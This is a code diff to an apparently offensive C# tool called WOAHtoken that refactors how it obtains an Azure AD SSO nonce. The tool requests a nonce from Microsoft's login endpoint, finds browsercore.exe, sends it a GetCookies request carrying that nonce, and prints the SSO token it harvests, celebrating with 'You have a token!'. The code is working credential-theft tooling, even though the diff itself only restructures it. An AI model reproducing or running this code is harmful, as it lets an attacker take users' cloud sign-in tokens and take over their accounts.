@@ -16,18 +16,9 @@ namespace WOAHtoken
         {
             public string Nonce { get; set; }
         }
-        static async Task Main(string[] args)
-        {
-            string tenantID;
-            if (args.Length > 0)
-            {
-                tenantID = args[0];
-            }
-            else
-            {
-                tenantID = "00000000-0000-0000-0000-000000000000";
-            }
 
+        public static async Task<string> getNonce(string tenantID)
+        {
             string url = "https://login.microsoftonline.com/" + tenantID + "/oauth2/token";
             HttpClient client = new HttpClient();
             var reqData = new Dictionary<string, string>
@@ -42,6 +33,22 @@ namespace WOAHtoken
 
             jsonResponse j = JsonConvert.DeserializeObject<jsonResponse>(resBody);
             Console.WriteLine("[+] Received nonce: " + j.Nonce);
+            return j.Nonce;
+        }
+        static void Main(string[] args)
+        {
+            string tenantID, nonce;
+            if (args.Length > 0)
+            {
+                tenantID = args[0];
+            }
+            else
+            {
+                tenantID = "00000000-0000-0000-0000-000000000000";
+            }
+
+            Task<string> nonceTask = getNonce(tenantID);
+            nonce = nonceTask.Result;
 
             // possible locations of browsercore.exe
             string[] bcLocations = {
@@ -76,7 +83,7 @@ namespace WOAHtoken
 
             // original uri: https://login.microsoftonline.com/common/oauth2/authorize
             bcoreJson = "{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" +
-                j.Nonce + "\",\"sender\":\"https://login.microsoftonline.com\"}";
+                nonce + "\",\"sender\":\"https://login.microsoftonline.com\"}";
 
             bcoreProc.Start();
 
@@ -111,8 +118,6 @@ namespace WOAHtoken
                 Console.WriteLine("[+] WOAH! (in excited Keanu voice) You have a token!");
                 Console.WriteLine(respContent);
             }
-
-            return;
 
         }
     }
